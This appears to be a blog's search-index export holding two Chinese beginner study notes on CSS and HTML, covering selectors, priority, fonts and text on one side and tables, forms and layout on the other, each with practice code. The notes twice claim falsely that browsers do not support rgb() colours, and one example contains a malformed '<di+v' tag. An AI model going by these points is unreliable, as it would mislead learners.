red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt; --&gt; &lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; --&gt; &lt;div&gt; 苹果1&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 123456div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;!-- 1.css --&gt; 效果： CSS 语法 CSS 语法CSS 语法规则由两个主要的部分构成：选择器，以及一条或多条声明: 选择器通常是您需要改变样式的 HTML 元素。 每条声明由一个属性和一个值组成。 属性是您希望设置的样式属性。每个属性有一个值。属性和值被冒号分开。 CSS声明总是以分号(;)结束，声明组以大括号({})括起来 例：h1{ color:blue; font-size :12px;} 其中h1 为选择器 color 是属性 blue是值。 CSS 注释：CSS注释以 “/*“ 开始, 以 “*/“ 结束。 颜色：颜色属性被用来设置文字的颜色。 颜色是通过CSS最经常的指定： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) 颜色的名称 - 如: red 常用的：rgb：：r是红色，g是绿色，b是蓝色。 123body &#123;color:red;&#125; h1 &#123;color:#00ff00;&#125; /* 可以写成 #0f0 */h2 &#123;color:rgb(255,0,0);&#125; /* 0-255 */ 是其颜色深浅 ==注 - 所有浏览器都不支持颜色的rgb（）属性，因此建议不要使用它。== CSS选择器基本选择器： id 选择器：可以为标有特定 id 的 HTML 元素指定特定的样式。HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。（==ID属性不要以数字开头==） class 选择器：class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。 例：&lt;p class=&quot;txt txt2&quot;&gt;aaa&lt;/p&gt; 。class 选择器在HTML中以class属性表示, 在 CSS 中，类选择器以一个点“.”号显示 *通配符：全部标签属性的都会有效果。 标签 div：div标签 的会有效果。 练习： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css选择器&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;div111 &lt;div&gt;div222&lt;/div&gt; &lt;p id=\"txt\"&gt;the way i am&lt;/p&gt; &lt;p class=\"txt1 txt2\"&gt;song&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; css： 123456789101112131415div&#123; color: red; width: 100px; height: 100px; background: yellow &#125;#txt&#123; color: #1f1;&#125;.txt1 &#123; font-size: 10px;&#125;.txt2 &#123; color: #ff2;&#125; 效果： CSS原理优先原则优先原则：后解析的内容，会覆盖掉原来解析的内容。 1:同一个选择器:从上往下执行。 例： 1234div&#123; color: red; color: green; &#125;/*最终是为绿色*/ 2:同一类型的选择器：从上往下执行 例： 123456div&#123; background: yellow;&#125;div&#123; background: red;&#125;/*最终是为红色*/ 123456.bg1&#123; background: yellow;&#125;.bg2&#123; background: blue;&#125;/*最终是为蓝色*/ &lt;div class=&quot;bg1 bg2&quot;&gt;hahaha&lt;/div&gt; 在HTML中，bg1 与bg2的位置交换也不管css解析的事情，所以交换后还是blue。 3：不同类型的选择器：看优先级 先解析低级的在解析高级的：* &lt; div &lt; class &lt; id 123456div&#123; color: red；&#125;.bg1&#123; color: yellow;&#125; /*最终是为黄色*/ 4：多重样式优先级 样式可以规定在单个的 HTML 元素中，在 HTML 页的头元素中，或在一个外部的 CSS 文件中。甚至可以在同一个 HTML 文档内部引用多个外部样式表。 一般情况下，优先级如下： 内联样式 &gt; 内部样式 &gt;外部样式 ==（谁优先级越高越最后解析）== 对于全部都是 当加上!important 这个选择器的内容就会最后进行。 继承原则==对于嵌套标签，子级继承父级。== 文字 文本 样式可以继承，其他的不能。 块级元素 没有设置的时候，会继承父级的宽，而高度则是看其内容长短。 CSS组成选择器分组选择器直接上代码了： 123456789div&#123; background: green; color: red;&#125;p&#123; background: green; color: red; font-size: 50px;&#125; 1234567div,p&#123; background: green; color: red;&#125;p&#123; font-size: 50px;&#125; 把div 与 p 里面相同的部分放到一个里面就行了。 嵌套选择器12345div p&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt; 只要在其父或父的以上级有div，那这个p里的东西就能生效。 效果： 子选择器这个和以上很类似，区别在只在其父为div时，才能生效。 12345div&gt;p&#123; background: green; color: red; font-size: 50px;&#125; 类比以上就是只有p2有css效果 同级选择器12345div+p&#123; background: green; color: red; font-size: 50px;&#125; 在平级的p才可以生效，对比以上，也就是p1是有css效果。 属性选择器12345p[title=cc]&#123; background: green; color: red; font-size: 50px;&#125; 12345678910111213&lt;body&gt; &lt;div&gt; div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p title=\"cc\"&gt;p3&lt;/p&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;p title=\"cc 1\"&gt;p1&lt;/p&gt;&lt;/body&gt; 基本标签==+== [属性=值]：p3出现css效果。 [属性~=值]：p1 p3出现css效果。 注意：代码中cc 1需要空格隔开，不隔没有效果。 [属性^=值]：开头有cc的字符就行cc1. p1 p3 出现cc效果。 [属性$=值]：类比^= 是结束。 伪元素选择器每个我自己写出来的元素都会有伪元素。、 例： 123456789&lt;p title=\"cc\"&gt; &lt;!--&lt;before&gt; --&gt; ppp &lt;!--&lt;after&gt; --&gt; &lt;/p&gt; 直接上代码： 1234567p::before&#123; content: \"before\" &#125;p::after&#123; content: \"after\"&#125; 效果： 块元素： 第一个字母：first-letter 第一行：first-line 1234p::first-letter&#123; color: red; font-size: 100px;&#125; 这些写就是会是p内内容第一个字符大写。 也可以为 12345&lt;p title=\"cc\"&gt; &lt;first-letter&gt;t &lt;/first-letter&gt; he way i am ; &lt;/p&gt; CSS 背景CSS 背景属性用于定义HTML元素的背景。 背景颜色background-color 属性定义了元素的背景颜色. 页面的背景颜色使用在body的选择器中: body {background-color:red;} 背景图像background-image属性描述了元素的背景图像. 默认情况下，背景图像进行平铺重复显示. body {background-image:url(&#39;1.png&#39;);} 背景图像 - 相关设置 水平或垂直平铺： 12345body&#123;background-image:url('gradient2.png');background-repeat:repeat-x;&#125; 里面repeat-x是x轴，repeat-y是y轴。 不平铺：background-repeat:no-repeat 定位： ​ background-position:50% 0% 这使其在x轴的中心， ​ x： left center right； ​ y: top center bottom； css字体css字体 字体系列：font-family 属性设置文本的字体系列，应该设置几个字体名称作为一种”后备”机制。 例：font-family:&quot;黑体&quot;, &quot;宋体&quot;,&quot;微软黑雅&quot;; 字体样式:font-style:italic;斜体 字体大小：font-size 属性设置文本的大小。font-size:40px; font-weight: 设置其粗细。font-weight: normal lighter blod; 练习： 123456body &#123; font-family: \"黑体\",\"宋体\"; font-style:italic; font-size:80px; font-weight: bold;&#125; /*5.css */ 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文字-字体&lt;/title&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"5.css\"&gt;&lt;/head&gt;&lt;body&gt; 这是一段字 &lt;br&gt; hello world!&lt;/body&gt;&lt;/html&gt; CSS - 文本文本属性集合 color属性用于设置文本的颜色 direction属性用于设置文本方向。 letter-spacing属性用于在组成单词的字母之间添加或减去空格。 text-indent属性用于缩进段落的文本。 text-align属性用于对齐文档的文本。 text-decoration属性用于下划线，上划线和删除文本。 text-transform属性用于大写文本或将文本转换为大写或小写字母。 white-space属性用于控制文本的流和格式。 text-shadow属性用于设置文本周围的文本阴影。 文本颜色： 十六进制值 - 如: ＃FF0000 一个RGB值 - 如: RGB(255,0,0) ==不推荐使用太多浏览器不支持== 颜色的名称 - 如: red 123body &#123;color:red;&#125;h1 &#123;color:#00ff00;&#125;h2 &#123;color:rgb(255,0,0);&#125; 文本的对齐方式文本可居中或对齐到左或右,两端对齐. 12345678910.a1&#123; text-align:right;&#125;.a2&#123; text-align:center;&#125;.a3&#123; text-align:left;&#125; 123456&lt;body&gt; &lt;p class=\"a1\"&gt;这是一段字&lt;/p&gt; &lt;br&gt; &lt;p class=\"a2\"&gt;hello world!&lt;/p&gt; &lt;p class=\"a3\"&gt;hhhhaaaa&lt;/p&gt;&lt;/body&gt; 文本修饰装饰文字，值为none（去掉修饰），underline，overline，line-through，blink。 12345678910.a1&#123; text-decoration:overline;&#125;.a2&#123; text-decoration:line-through;&#125;.a3&#123; text-decoration:underline;&#125; 文本缩进文本缩进属性是用来指定文本的第一行的缩进。 p {text-indent:50px;} 文本方向值是ltr或rtl。 123.a&#123; direction:rtl; &#125; 文字就先写到这。 CSS 链接链接样式 a:link - 正常，未访问过的链接 a:visited - 用户已访问过的链接 a:hover - 当用户鼠标放在链接上时 a:active - 链接被点击的那一刻 a:link {color: red;} CSS列表常用的就是 123456ul&#123; list-style-type: none; list-style-type: disc; 实心圆 list-style-type: circle; 空心圆 list-style-type: square; 实心方格&#125; 最常用就是 none 然后换成自己想弄成的图片。 ol 对应就是 lower-alpha upper-alpha lower-roman等等； 作为列表项标记的图像 1234ul&#123; list-style-image: url(&apos;&apos;);&#125;","categories":[],"tags":[]},{"title":"HTML学习","slug":"HTML","date":"2019-03-29T12:04:07.000Z","updated":"2019-10-15T16:05:00.000Z","comments":true,"path":"2019/03/29/HTML/","link":"","permalink":"https://chumen77.github.io/2019/03/29/HTML/","excerpt":"","text":"HTML 学习HTML 基础 HTML标题：是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的.；其会因为数字变化而显示的字体大小变化； HTML段落：通过标签&lt;p&gt; 来定义的. HTML链接：通过标签&lt;a&gt;来定义的。 HTML图像：通过标签 &lt;img&gt; 来定义的。 HTML 文本HTML 标题标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签进行定义的.&lt;h1&gt; 定义最大的标题。 &lt;h6&gt;定义最小的标题。浏览器会自动地在标题的前后添加空行。 标题很重要： 不要仅仅是为了生成粗体或大号的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。 HTML 注释注释： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。 1&lt;!-- 这是一个注释 --&gt; HTML 段落浏览器会自动地在段落的前后添加空行。（&lt;/p&gt;是块级元素） HTML 水平线1：&lt;hr&gt;标签在 HTML 页面中创建水平线。 HTML 文本格式化通常用到&lt;strong&gt;&lt;em&gt;&lt;del&gt;这几个标签。 练习：1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;h4&gt;标题4&lt;/h4&gt; &lt;h5&gt;标题5&lt;/h5&gt; &lt;h6&gt;标题6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;标签有大小之分 --&gt; &lt;h2&gt;五花山&lt;/h2&gt; &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt; &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt; &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt; &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt; &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt; &lt;!-- 几个标签的嵌套 --&gt; &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 图像 ==HTML 图像-== ： 标签（ &lt;img&gt;）是空标签，意思是说，它只包含属性，并且没有闭合标签。 源属性（&lt;src&gt;）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意绝对路径和相对路径（可以用../来返回 一级目录，返回几级目录就写几个它就行)。 Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。==搜索引擎也是通过此描述来收集图片的==. 高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。 练习： 12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"chumen的qq图像\" title=\"chumen的qq图像\"&gt;&lt;/body&gt;&lt;/html&gt; 图片的映射目标是为了在一张图片上的某个位置点击后才可以实现某个功能。 这需要用到usemap=&quot;#diyname&quot; 然后用&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;标签来对应。 核心代码：&lt;map name=&quot;1map&quot;&gt; &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt; &lt;/map&gt; shape是选择的形状，coords是坐标，坐标确定推荐用qq的截图功能那里来确定，比如： 那这个彩色箭头指的位置就是在这个图像的（233,456）位置。 练习： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"1.png\" alt=\"\" usemap=\"#1map\"&gt; &lt;map name=\"1map\"&gt; &lt;area shape=\"circle\" coords=\"300,255,50\" target=\"_blank\" href=\"http://www.baidu.com\"&gt; &lt;/map&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 超链接超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 &lt;a&gt;来设置超文本链接。 HTML 链接语法:&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; ,href 属性描述了链接的目标。 target 属性 :target=&quot;_blank&quot;效果就是在新窗口（空白界面）做出来 。 id 属性:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID: &lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”: &lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 解释加补充：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（&lt;a href=&quot;# &quot;&gt;），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。 &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; 做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个 练习：（为了方便阅读，省略了很多的&lt;br&gt;.） 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=\"http://www.mi.com\" target=\"_blank\"&gt;&lt;img src=\"1.png\"&gt;&lt;/a&gt; &lt;!-- /*书签标记：锚点*/ --&gt; &lt;a href=\"#end\"&gt;end&lt;/a&gt;&lt;br id=\"aa\"&gt;&lt;br&gt;&lt;br id=\"miao\"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=\"miao\"&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=\"end\"&gt;&lt;/a&gt; &lt;a href=\"#miao\"&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; HTML 列表 HTML无序列表：&lt;ul&gt;与 &lt;li&gt;其点的样式(圆圈，圆心，正方形）用css来控制&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML 有序列表 &lt;ol&gt;与&lt;li&gt; 用法和无序相似，且有序与无序之间可以互相嵌套，嵌套过程中点的形状也会自动变化。 HTML 自定义列表：这个是比较常用的，自定义列表以&lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt;开始。其不仅仅是一列项目，而是项目及其注释的组合。 123456&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt; 练习： 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;ul style=\"list-style-type:circle\"&gt; &lt;li&gt;无序列表1&lt;/li&gt; &lt;li&gt;无序列表2&lt;/li&gt; &lt;li&gt;无序列表3&lt;/li&gt; &lt;li&gt;无序列表4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;有序列表1&lt;/li&gt; &lt;li&gt;有序列表2&lt;/li&gt; &lt;li&gt;有序列表3&lt;/li&gt; &lt;li&gt;有序列表4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;标题1&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;dt&gt;标题2&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML表格 HTML 表格：表格由 &lt;table&gt;标签来定义。每个表格均有若干==行==（由 &lt;tr&gt; 标签定义），每行被分割为若干==单元格==（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。这个有利于多样化，在分清栏目后在td里放内容就ok。 HTML 边框属性:&lt;table border=&quot;1&quot;&gt;会出现表框。 HTML 表格表头:表格的表头使用 &lt;th&gt; 标签进行定义。&lt;th&gt;标签与&lt;td&gt;标签用法相似只是显示的效果不同，会有粗体居中的效果； HTML表格合并：用 colspan： 横向行 rowspan ：竖纵行。 HTML表格单元格边距的设置：类似 设置边框 直接在table标签里放入cellpadding=“自定义的数字”，就设置好了。 练习： 1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;部门&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=\"3\"&gt;开发组&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=\"2\"&gt;工资合计&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML 表单表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。 `input元素 ` HTML 表单 - 输入元素输入标签&lt;input&gt;。 文本域文本域通过&lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 `First name: Last name: ` 在大多数浏览器中，文本域的缺省宽度是20个字符。 密码字段&lt;input type=&quot;password&quot;&gt; 来定义 123&lt;form&gt;Password: &lt;input type=\"password\" name=\"pwd\"&gt;&lt;/form&gt; 单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单单选框选项。 12345&lt;form&gt;&lt;input type=\"radio\" name=\"sex\" value=\"male\"&gt;Male&lt;br&gt;&lt;input type=\"radio\" name=\"sex\"value=\"female\"&gt;Female&lt;/form&gt; Name 是可以进行==分组==。想要有效果 value也少不了。 复选框&lt;input type=&quot;checkbox&quot;&gt;定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。 1234&lt;form&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\"&gt;I have a bike&lt;br&gt;&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\"&gt;I have a car &lt;/form&gt; 类似单选三者缺一不可。 提交按钮&lt;input type=&quot;submit&quot;&gt;定义了提交按钮. 1234&lt;form name=\"input\" action=\"\" method=\"\"&gt;Username: &lt;input type=\"text\" name=\"user\"&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt; ==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。 name：为控件命名，以备后台程序 ASP、PHP 使用== 练习：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"\"&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt; admin&lt;input type=\"text\" name=\"user\"&gt; password&lt;input type=\"password\" name=\"password\"&gt; &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"male\"&gt;男 &lt;br&gt; &lt;input type=\"radio\" name=\"sex1\" value=\"female\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt; &lt;!-- &lt;input type=\"radio\" name=\"sex\"&gt;男 &lt;input type=\"radio\" name=\"sex\"&gt;女 &lt;input type=\"radio\" name=\"sex\"&gt;中性 --&gt; &lt;br&gt; &lt;!-- 兴趣复选框 --&gt; &lt;input type=\"checkbox\" name=\"xq\" value=\"kanshu\"&gt; 看书 &lt;input type=\"checkbox\" name=\"xq\" value=\"xuexi\"&gt; 学习 &lt;input type=\"checkbox\" name=\"xq\" value=\"music\"&gt; 听歌 &lt;br&gt; 城市&lt;select name=\"city\"&gt; &lt;option value=\"shanghai\"&gt;上海&lt;/option&gt; &lt;option value=\"beijing\"&gt;北京&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" name=\"\"&gt;&lt;br&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 效果： HTML布局HTML 布局 - 使用&lt;div&gt; 元素. 可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用css来设置样式。 这中间需要用到float：left等 来控制一个div中套用的div的位置。 HTML中&lt;div&gt;元素是块级元素，它可用于组合其他 HTML元素的容器。 &lt;div&gt; 元素的另一个常见的用途是文档布局。&lt;div&gt;元素经常与 CSS 一起使用，用来布局网页。 &lt;div&gt; 元素没有特定的含义。 练习： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;div style=\"background: yellow; width: 50px;\"&gt; 这是个div这是个div这是个div这是个div &lt;/div&gt; --&gt; &lt;div style=\"background: yellow;height: 100px;\"&gt;导航&lt;/div&gt; &lt;div style=\"background: green;width: 20%; float: left; height: 300px;\"&gt;菜单&lt;/div&gt; &lt;di+v style=\"background: red;width: 80%; float: left;height: 300px;\"&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HTML嵌套规则元素分类： 文字类块元素：p h1~h6 容器类块元素：div table tr td th form ul li ol dl dt dd 行元素:不独立成行，不可以 内容决定a img input strong em del span 特殊字符:br 规则 块元素可以嵌套行元素 &lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt; 行元素可以嵌套行元素 &lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt; 行元素不可以嵌套块元素 文字类抉元素不可以嵌套块元素 容器类抉元素可以嵌套块元素","categories":[],"tags":[]}]}